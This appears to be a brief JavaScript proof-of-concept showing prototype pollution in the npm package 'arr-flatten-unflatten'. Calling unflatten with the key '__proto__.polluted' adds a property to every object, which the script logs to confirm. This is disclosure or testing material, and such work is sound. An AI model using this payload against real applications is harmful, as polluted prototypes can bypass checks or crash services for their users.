var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
console.log({}.polluted);
const {unflatten} = require('arr-flatten-unflatten');
unflatten({ '__proto__.polluted': 'yes' });
console.log({}.polluted);